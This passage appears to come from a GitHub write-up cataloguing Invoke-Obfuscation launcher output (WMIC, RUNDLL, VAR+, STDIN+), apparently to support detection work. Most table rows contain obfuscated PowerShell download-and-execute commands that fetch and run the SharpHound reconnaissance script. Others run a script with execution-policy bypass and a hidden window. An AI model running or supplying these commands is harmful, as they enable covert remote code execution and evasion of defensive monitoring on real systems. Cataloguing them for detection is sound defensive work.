[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 46 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\0 | wMic.exE   'ProcESs'  "calL" "creaTE"  "POweRSHELL  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | WMIc.exe   PROceSs  "cALl"   "CrEATE"   "pOWERSheLl  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 47 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\1 | C:\wInDoWS\SystEm32\wbem\wmIc.eXe   'proceSS'    Call    creaTE  "poWERshell  -NOeXIt    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | WMIc   PrOCeSS     CaLl    'cREaTe' "POwERSheLL  -NoE   powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 48 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\2 | Wmic "PRocess"  'cALl'    creaTE   "POweRShelL -nOniNTERACtI   Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | C:\winDOwS\syStEm32\wBeM\WMIc.exe "pRoCEsS"   "cALl"   "cREATe" "pOweRShElL  -noninTeractIvE   powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 49 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\3 | C:\WINdOws\sysTEm32\WBeM\WmIC.ExE   'procEsS'   caLL    cREAtE   "PoweRSHeLl  -nOL    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\windOwS\SystEM32\wbeM\WmIc.eXE   PRocESS  'CALl'   'CreatE'  "pOWeRsHELl  -Nol  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 50 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\4 | WmiC.EXE  'PrOCEsS' 'cAll'  creAtE   "pOWerShEll -NopROfILe  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | WMIC.EXe 'PrOcEss'   "CAll"   "cReate"   "pOwErshELL  -noPRof   powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 51 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\5 | c:\windowS\sYSTEM32\WBeM\wMiC.EXE  'ProCesS'  CALl    "cReaTe"   "poWeRshELL  -coM   Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | WmIC   ProCeSS    caLl    'cREATE'   "POWerSHeLl  -coMma  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 52 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\6 | WMIc.exe  "PrOceSS"   'caLL'  "crEAtE" "PoWErsHELl -WINDowStY  HI   Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | WMIC   "pRoCeSs" "caLl"  "creATE" "poWErsheLL -wI  HidDEN   powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 53 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\7 | WMiC.EXE   'PROCess'  "cALL" 'creaTE'   "poweRSHEll -ex  ByPaSs   Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | WMiC  proCeSs    'CAlL'    CReAte "powERshELL -EXECUtIOnpo bYPASs   powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 54 | LAUNCHER | LAUNCHER\WMIC | LAUNCHER\WMIC\8 | C:\wiNdOWs\SYsTEM32\WBeM\wMic  "proCESS"  CAlL   CreatE   "c:\Windows\SyswOw64\wInDOwSpowerSHelL\V1.0\PoWersHEll.eXE  Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | wMIc.exe  'PrOCess'   "CAll"   "CreAtE"   "C:\wiNdows\sySWoW64\wInDOwspOwErShElL\V1.0\pOwershelL.eXE  powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"

### RUNDLL LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 55 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\0 | c:\WiNDows\sYStem32\RUndLl32   SHELL32.DLL,, ,  ShellExec_RunDLL "POwERShELL"    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\winDOws\sYSTEM32\RunDlL32.EXe   SHELL32.DLL ShellExec_RunDLL  "powErSHeLl"     "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 56 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\1 | RUnDLl32 SHELL32.DLL,ShellExec_RunDLL  "PoWerSHell"   "-NoEXiT  "   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | RuNDlL32.eXe SHELL32.DLL  , ,,ShellExec_RunDLL  "pOWErShEll"   "  -noE"    "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 57 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\2 | C:\WINdoWS\sysTEM32\RuNDLl32.EXe SHELL32.DLL, ,  ,ShellExec_RunDLL "powersHELl"  " -NoNintEracT"     "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\wInDOWs\sYsTEm32\rundLl32.Exe SHELL32.DLL ShellExec_RunDLL "powerSHEll" "  -NonINTEr "  "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 58 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\3 | C:\Windows\SYsTeM32\ruNDLl32   SHELL32.DLL ShellExec_RunDLL "pOweRShell"  "  -nol"   "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | rUNdLl32   SHELL32.DLL ,,, ShellExec_RunDLL  "POweRsheLL"   " -NoLo  "   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 59 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\4 | RUNdLl32 SHELL32.DLL ShellExec_RunDLL "pOweRSheLl"  " -nop  "  "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\WiNdowS\sySTem32\RuNDLl32   SHELL32.DLL,ShellExec_RunDLL  "pOwErsHElL"  "-noPrOFI "    "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 60 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\5 | RunDLL32 SHELL32.DLL,,  ShellExec_RunDLL "POWErSHEll"   " -COMm"    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\WinDOWs\sYstem32\rUNdLl32.Exe   SHELL32.DLL ShellExec_RunDLL  "powerShell"  "-COmMA "    "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1" | rUnDlL32.eXE   SHELL32.DLL,ShellExec_RunDLL   "poWErSHeLL" "-COmMand  "  "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 61 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\6 | c:\WIndOwS\SystEM32\rundlL32.eXE  SHELL32.DLL,ShellExec_RunDLL "pOwErsHeLl"  "-WindOws  hIdden "  "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | C:\WINdOwS\SySTeM32\rUndlL32.eXE  SHELL32.DLL,ShellExec_RunDLL  "POwERsHELL"  " -wiNDOW  HiddEN "   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 62 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\7 | rundLl32.exE  SHELL32.DLL,,  ,ShellExec_RunDLL   "pOWerSHEll" " -eXEcUtiOnPOl  BYpASs "    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\winDOWS\SYSTem32\RUndLl32.eXe   SHELL32.DLL ShellExec_RunDLL "POWERShEll"   "-ExecUtIOnP  BypasS"    "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"
| 63 | LAUNCHER | LAUNCHER\RUNDLL | LAUNCHER\RUNDLL\8 | RUndLl32.EXE SHELL32.DLL ShellExec_RunDLL  "c:\WIndoWs\SYsWOW64\wiNdowSpOweRsHell\v1.0\pOWERSHEll.eXE"    "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound" | c:\wIndows\SYsTEM32\RuNdll32.eXE  SHELL32.DLL ShellExec_RunDLL  "C:\WinDoWs\SYsWow64\WindOwsPOwerSHEll\V1.0\PowersheLL.eXE"   "powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1"

### VAR+ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 64 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\0 | cmd/c "SeT   TXs=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&pOwErsHELl   sV ( \"8L7\"  +  \"vQ\" )  (  [TypE]( \"{0}{2}{3}{1}\" -F'EnVI','T','RO','nmen'));   .(  ( ^&(\"{2}{0}{1}\"-f 'RiA','BLE','VA'  ) (  \"{0}{1}\" -f '*','mDR*') ).\"N`Ame\"[3,11,2]-joIN'')((   (vaRIaBle  ( \"8l7\" +\"Vq\"  )  -ValUE )::( \"{1}{4}{0}{2}{3}\" -f'NtvA','getEN','r','iAbLE','Vironme'  ).Invoke('TxS',(\"{0}{2}{1}\" -f'P','esS','ROC')) )   ) " | cmD.exe   /C"sEt  wMBg=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&pOweRShELl     . ( ${P`S`hoME}[4]+ ${p`shO`Me}[30]+ 'x') (  (    ^&  (\"{1}{0}\"-f'I','gC'  ) (\"{2}{1}{0}\"-f'G','wmB','EnV:')  ).\"v`Alue\" ) "
| 65 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\1 | CMd  /c "SEt   Fpo=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&& POWerSHeLl  -NOeXit  .   ( ${SHE`L`lID}[1]  +  ${s`hELl`id}[13]  +'X'  )( (  ^&  ('ls'  ) (\"{1}{2}{0}\" -f 'o','EN','V:fp'  )).\"va`luE\")" | cmd.exe   /c   "Set   vce=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&& PoWershELl -nOeX       .  (\"{0}{1}{2}\" -f'SeT-','i','tEm' ) ( \"VaR\"  + \"Iab\"  + \"Le:\" +\"39E\" ) (  [TYPE]( \"{2}{1}{0}\" -F't','mEN','eNviroN'  ))   ;  (    (     ^&  (  \"{1}{2}{3}{0}\" -f 'e','get','-VarIaB','l' ) (  \"39\" + \"e\")    ).\"V`ALUe\"::(\"{2}{3}{1}{0}\" -f 'e','ARiaBL','GEtENVIrO','nmENTV'  ).Invoke(  'vCE',(  \"{1}{2}{0}\" -f'CeSs','pr','o')  )  )^| ^&(  \"{4}{1}{3}{2}{0}\" -f'oN','-EX','i','prESs','INvOKe'  )"
| 66 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\2 | cMd.EXe/C "sET  hYj=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&& pOWeRsHELL -nONi    ${e`XECU`TiOnCONt`eXt}.\"InvoK`eComM`A`ND\".(\"{0}{1}{2}\" -f 'iNvOKesC','R','IPT'  ).Invoke(   (  ^&  ( 'gI' ) (  \"{0}{2}{1}\"-f 'En','hyJ','v:' )  ).\"Va`lUe\"  )" | CMd /c"sET  ZKB=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&& pOwErSHELl  -NONiNtErA     seT-VariABLe (  'W'+  'yi'  )  (  [type](  \"{0}{1}{2}\" -F'EnVir','O','nmEnT')  )  ;    ${exEcuTiOnCOnTExT}.\"i`N`VokE`COmmANd\".\"invoKeSC`R`I`PT\"((  $WYi::(  \"{4}{0}{2}{1}{3}\"-f 'En','IaB','VIRoNmENtVaR','le','geT').Invoke( 'ZKB',(\"{0}{2}{1}\"-f'pROCe','s','s'  )  ) )  )"
| 67 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\3 | CMd.ExE  /c   "SET   IOZF=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&   POwErSHELl  -nOlo   $1EVd  =    [tYPe](  \"{2}{0}{1}\" -f'N','vironment','e' )  ;   ${exECuTIONCONtExt}.\"iNVOkEC`OM`mand\".\"I`NvO`kesCr`ipt\"((    $1eVD::(\"{0}{1}{4}{2}{3}\"-f 'g','ETenVi','OnMEnTvARIA','blE','r' ).Invoke(( \"{0}{1}\" -f 'iOz','F'  ),( \"{1}{0}\"-f'RoCESS','P') ) ) )" | cMd.eXe   /C"Set   ZpN=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&pOwERsHELl -nOl   ${ExeCu`T`iONco`NteXt}.\"in`VO`KEc`OM`mANd\".( \"{1}{3}{2}{0}\" -f'riPT','in','KESc','VO'  ).Invoke( (  ^&(  \"{0}{1}\"-f'iTe','M') (  \"{0}{1}\" -f'ENv:','zPN'  )).\"vA`lUE\"  )"
| 68 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\4 | C:\WIndows\syStem32\cmD   /C"sEt   nTY=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&& powerShell -noproFiL     SEt-ITeM ( \"{1}{2}{3}{0}\"-f '2N7sm','V','ar','Iable:Y'  ) (  [TYPe](\"{1}{3}{0}{2}\"-F 'i','en','roNMeNt','v'  )   )   ;${E`XeCUtIoncOn`T`ext}.\"inVoK`ecoM`mANd\".\"INvO`kESCR`ipT\"(    (   $y2n7sM::(  \"{6}{2}{1}{4}{5}{3}{0}\" -f 'E','m','oN','rIABl','eNtV','a','GEtENvir' ).Invoke( 'NtY',( \"{0}{1}\" -f 'Proc','eSS'  ) ) )   )" | cmD.eXE/C "Set   SyH=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&  poWERSHelL -nOpROfi   ( .(  \"{2}{0}{1}\" -f 'HI','LditEm','C') ( \"{1}{2}{0}\"-f 'Yh','eNV:','s' )).\"VA`Lue\"   ^|^&  (  ${e`Nv:`cOM`sPEC}[4,24,25]-joIN'')"
| 69 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\5 | C:\WiNDowS\systEm32\cMd.exE   /c  "sET   JIc=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&   POWErsHell -coM     ${K2T`Sa}   =  [TyPe](  \"{0}{2}{1}\"-f 'en','T','ViroNmen')  ; ${exEcuTionCoNTEXT}.\"Inv`o`keCommAnd\".(\"{0}{3}{1}{2}\"-f 'I','voke','ScrIpT','n').Invoke((    ${k2`TSa}::(  \"{1}{0}{2}{3}\"-f'MenT','GEtEnVIrOn','VariaB','LE' ).Invoke('jIC',(\"{0}{2}{1}\" -f'PR','cESS','O'  ) )  )  )" | cmD.EXe   /C "sET   oINm=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&PoWershELl  -COm  ( ^&  ('Gv') (  \"{0}{1}\"-f'e','X*Xt' ) -vaLUeoNLY).\"InVo`KecOm`MAND\".(\"{0}{1}{2}\" -f 'iN','VO','KeSCriPt').Invoke( ( .( 'GI') (  \"{2}{1}{0}\" -f'nM',':oi','ENV')  ).\"vA`LUE\"   )"
| 70 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\6 | C:\WinDows\SyStEm32\cMD.EXe   /c   "SET   tmI=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&POWershEll  -w  hIDDEN  SET-VaRIAbLe ( \"{0}{1}{2}\"-f '4Y','3A','Oq' ) (   [TYpe](\"{3}{2}{1}{0}\" -F'nT','vIrONME','n','E')  )    ;     ^& (  ${SHeL`l`iD}[1] +${SheL`L`ID}[13]  +'X' ) ((  (GEt-ITEm  (  \"{1}{2}{3}{0}{4}\" -f ':4y','vaR','Ia','Ble','3aoQ'  )   ).vAlue::(\"{2}{0}{3}{4}{1}\" -f'nvIroNMe','lE','gete','n','TVARIAB'  ).Invoke(  'TMi',(  \"{0}{2}{1}\"-f 'pRoCE','S','S'  )  ) ) )" | C:\WindOws\sYsteM32\cMd   /C "Set  zErI=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&& poWERshElL -WiNDoWSTy  HiddEn    sET-ITEm (\"Vari\" +  \"ABLe:\" +\"6bv\"  ) (  [TypE]( \"{2}{0}{1}\" -f'IroNM','ENt','env' )   )  ;  ^&  ( \"{3}{1}{4}{0}{5}{2}\" -f '-expRes','ok','ion','inv','E','S')(  (  $6bv::( \"{4}{2}{3}{0}{1}\" -f 'eNTvAriA','bLE','eTE','nVIronm','g').Invoke(( \"{1}{0}\"-f'Eri','z'  ),(\"{0}{1}\"-f'PROcEs','s') ))   ) "
| 71 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\7 | Cmd.eXe /c "SeT   Tse=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&& pOwerShELL  -EXECutIo  BYPAss    ^& ( ${PshO`ME}[21]  + ${Ps`ho`me}[34] + 'x') ( (.( \"{1}{0}\"-f'iR','D') (\"{1}{0}\" -f'v:Tse','EN' ) ).\"v`ALUe\" ) " | CMD  /c"sEt   POt=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&POWeRshelL  -ex  BYPASS     ^&  ( \"{1}{2}{0}\" -f 'Em','s','ET-iT')  (  'v' +  'Ar' + 'iABLe:'  + '509q'  )  (    [tYpe](\"{2}{1}{0}\"-f 'NT','NVirOnMe','e'  )  );  (  .( 'GI') (  \"{2}{1}{0}\"-f '*xt',':eX','variAblE' )).\"v`ALue\".\"inVO`KEcOMm`AND\".(\"{0}{1}{2}{3}\" -f'i','nvokEsC','ri','PT').Invoke( (   ${50`9Q}::( \"{0}{4}{1}{2}{5}{3}\" -f'gEt','rOnM','eNt','BLE','enVi','vAriA' ).Invoke( 'POt',( \"{0}{1}\"-f'PROCes','S'  ) ) ) )"
| 72 | LAUNCHER | LAUNCHER\VAR+ | LAUNCHER\VAR+\8 | cmD  /c  "set  lHZ=Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound&&   C:\winDowS\SySWow64\WIndOwspowERShElL\V1.0\poWeRsHElL.Exe     ^& (  \"{0}{2}{1}\" -f 'SeT-VAR','le','IAb' )  ('va'  +  '518' ) (   [TyPE](  \"{1}{2}{0}\" -F 'ENT','e','nviRoNM'  )  )    ;    ^&  ( ([STRiNg]${v`ER`Bo`seprEfErENCe} )[1,3]  +'x'-jOiN'' ) (   (    ${V`A518}::(\"{5}{3}{1}{0}{6}{2}{4}\" -f 'MeNT','eNvIRon','IaB','et','le','g','VAR').Invoke('Lhz',( \"{2}{1}{0}\" -f 'sS','Ce','prO' )  ))) " | c:\WiNDowS\SyStem32\cMD   /C  "SEt   USho=powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1&&  c:\wINDoWS\SYSWOw64\WinDoWspOWeRSHeLL\V1.0\PowERsHeLl.eXE   (  ^&(\"{2}{0}{1}\"-f 'E','T-iTEm','g' ) ( \"{0}{2}{1}{3}\"-f'VarIAB','E:eX*X','l','T' ) ).\"vA`LuE\".\"In`VoKEc`OmManD\".(  \"{2}{1}{0}\"-f'rIpt','keSC','INvo'  ).Invoke(   ( .( \"{1}{0}\" -f 'em','GeT-IT'  ) (  \"{1}{0}{2}\" -f'NV:uSh','E','O'  )  ).\"VA`LuE\" )"

### STDIN+ LAUNCHER OBFUSCATION
[Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
| Case # | Option #1 | Option #2 | Option #3 | Command #1 Result | Command #2 Result |
| :---: | :---: | :---: | :---: | :--- | :--- |
| 73 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\0 | CMd.Exe/c  "EChO/Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|  POWershEll  $eXECUtIoncOnTexT.inVOkECOMmANd.INvOkesCRIPt( ${INpUT} )" | C:\wiNdOws\sYStem32\CMd  /c"ecHo\powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \| POweRsHELL  ${ExECuTIONcOnTexT}.INvoKeCOmmAnD.iNVokESCrIpT($InPuT  )"
| 74 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\1 | C:\wIndOWS\sYsTEm32\Cmd.exe  /C  "  ECHo Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  \|  PoWERShElL  -nOExIT    -" | c:\wIndOWS\SYSTeM32\cmd  /c   "  EcHO\powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \| pOweRSHeLl  -noexIt    -"
| 75 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\2 | CMd   /C   "  EchO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound  \| pOWerShELl -noniN   ${inPUT}^\|^&( $sHellid[1]+$sheLlID[13]+'x')" | CmD /C  "  echo\powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \| PoWeRShell  -nonin  . ( $SHELLiD[1]+$sHELLId[13]+'X')( ${inpuT}) "
| 76 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\3 | c:\wiNDows\sySTeM32\cMD.EXe   /C   "ecHO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|  pOwerSHeLl -nOlOG   ${exEcutiONConTEXT}.InvOkecoMmAnd.InvoKeSCrIPt( $inPUt  )" | cmD.ExE/C "  eChO/powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1  \|  pOweRSheLl -NoLOG   ${EXeCuTiOncOnteXt}.invOkECOmMAnD.InVOKeSCrIpT($iNPuT)"
| 77 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\4 | C:\WInDoWS\SysTEM32\CMD.exE  /c "  ECHO Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \| poWerSheLL  -NOPRO   (vaRIABLe 'exEcUtIonCONtExT' -vaLu).iNvOkecOmmAnd.INVOkEScRipT(  ${iNPUt} )" | Cmd.ExE   /C  "  eCHo\powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \| PoWeRSHell -NOpROfIle    $inpUt ^| ^& ( $pShOME[21]+$pshoMe[30]+'x')"
| 78 | LAUNCHER | LAUNCHER\STDIN+ | LAUNCHER\STDIN+\5 | c:\WINdoWS\syStEM32\cMD.EXe   /c   "  EcHO\Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound \|  powershEll -CoMmaN    ${ExecUTioncoNtExT}.inVOKeCoMmANd.iNvOKescrIpt( ${iNPUt} )" | CmD  /c " Echo\powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1 \|  poWERsHeLl -c   ^& ( $SHelliD[1]+$ShelLID[13]+'X') ( ${inpUt}) "
